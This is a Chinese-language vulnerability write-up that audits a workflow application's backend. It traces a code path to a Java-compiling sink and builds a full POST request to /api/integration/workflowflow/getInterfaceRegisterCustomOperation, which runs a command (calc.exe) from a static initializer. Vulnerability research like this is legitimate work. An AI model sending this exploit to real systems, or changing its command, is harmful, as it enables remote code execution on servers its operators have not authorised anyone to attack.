某应用存在后台RCE，根据相关信息，我们在对后台审计过程，这里发现一处调用newInstance实例化

![1670905852_6397fffc0b7900881a716.png!small](https://image.3001.net/images/20221213/1670905852_6397fffc0b7900881a716.png!small)

溯源到 InterfaceRegisterCustomOperationCmd #excute

![1670905862_63980006efc7231b4904d.png!small](https://image.3001.net/images/20221213/1670905862_63980006efc7231b4904d.png!small)

![1670905868_6398000cc3e536b76fd49.png!small](https://image.3001.net/images/20221213/1670905868_6398000cc3e536b76fd49.png!small)

![1670905875_6398001367e88fffa24cd.png!small](https://image.3001.net/images/20221213/1670905875_6398001367e88fffa24cd.png!small)

![1670905882_6398001a4e6f1d828cc34.png!small](https://image.3001.net/images/20221213/1670905882_6398001a4e6f1d828cc34.png!small)

访问路径为 /api/integration/workflowflow/getInterfaceRegisterCustomOperation

getInterfaceRegisterCustomOperation调用了execute，首先判断了用户，所以这里是后台漏洞

![1670905888_63980020d07360f12e47a.png!small](https://image.3001.net/images/20221213/1670905888_63980020d07360f12e47a.png!small)

因为我们需要这个污点函数JavaCodeToObject，所以要满足if的条件并且控制var18和var20

![1670905894_63980026d29f5e7141bd9.png!small](https://image.3001.net/images/20221213/1670905894_63980026d29f5e7141bd9.png!small)

这里var14要为add

![1670905900_6398002c20fcd08e4f284.png!small](https://image.3001.net/images/20221213/1670905900_6398002c20fcd08e4f284.png!small)

var14的值是从请求参数method取得，因为前面是指定POST方法所以这里`method=add`

![1670905905_6398003152a5e12e32801.png!small](https://image.3001.net/images/20221213/1670905905_6398003152a5e12e32801.png!small)

进入if判断后var15的值如果为空就会return掉，所以这里`actionid`的值不为空就好，结合上面的条件就是`method=add&actionid=1`

![1670905911_63980037e5657669d53fa.png!small](https://image.3001.net/images/20221213/1670905911_63980037e5657669d53fa.png!small)

这里var18的开头如果不是`weaver.interfaces.workflow.action.javacode.Action`将会进入下面的判断导致抛出异常，达不到我们想要的结果，所以这里`classname=weaver.interfaces.workflow.action.javacode.Action`，结合上面的参数`method=add&actionid=1classname=weaver.interfaces.workflow.action.javacode.Action`

![1670905918_6398003ebd05bf214cc7f.png!small](https://image.3001.net/images/20221213/1670905918_6398003ebd05bf214cc7f.png!small)

下面var20值取自javacode参数，结合上面payload为`method=add&actionid=1&classname=weaver.interfaces.workflow.action.javacode.Action&javacode=`

![1670905923_63980043c4a49fc56d5b4.png!small](https://image.3001.net/images/20221213/1670905923_63980043c4a49fc56d5b4.png!small)

if如果var18包含`weaver.interfaces.workflow.action.javacode`进入我们想要的javacodetoobject调用，所以`classname=weaver.interfaces.workflow.action.javacode.Action.weaver.interfaces.workflow.action.javacode.Action`两个条件用.连接否则会报加载异常

![1670905929_6398004913e908d8a3347.png!small](https://image.3001.net/images/20221213/1670905929_6398004913e908d8a3347.png!small)

根据上面的条件都已满足var18和var20条件，构造var20的参数为 `javacode=package
weaver.interfaces.workflow.action.javacode.Action.weaver.interfaces.workflow.action.javacode;
import java.io.IOException; public class test { static { try {
Runtime.getRuntime().exec("calc.exe"); } catch (IOException e) {
e.printStackTrace(); } } }`这里将命令执行的代码放在静态代码块是因为实例化的时候会自动执行static中的代码，达到命令执行

![1670905935_6398004f13918a0aef063.png!small](https://image.3001.net/images/20221213/1670905935_6398004f13918a0aef063.png!small)

实际发包好像没有利用成功，回头看一下代码 发现丢了个参数 dtinfo_CustomParameterData

    
    
    POST /api/integration/workflowflow/getInterfaceRegisterCustomOperation HTTP/1.1  
    Host:   
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6  
    Cookie: ecology_JSessionid=aaa8G6PRBnnBD82yi6Fky; JSESSIONID=aaa8G6PRBnnBD82yi6Fky; __randcode__=d2fa15e2-395e-4b3b-a004-82fc07c18695; loginidweaver=1; languageidweaver=7; loginuuids=1  
    Connection: close  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 548  
    ​  
    method=add&actionid=1&classname=weaver.interfaces.workflow.action.javacode.Action.weaver.interfaces.workflow.action.javacode.Test&dtinfo_CustomParameterData=11&javaCode=package weaver.interfaces.workflow.action.javacode.Action.weaver.interfaces.workflow.action.javacode;  
    import java.io.IOException;  
    public class Test {  
      static {  
          try {  
              Runtime.getRuntime().exec("calc.exe");  
          } catch (IOException e) {  
              e.printStackTrace();  
          }  
      }  
    }

![1670905948_6398005cecf6dcbadf898.png!small](https://image.3001.net/images/20221213/1670905948_6398005cecf6dcbadf898.png!small)

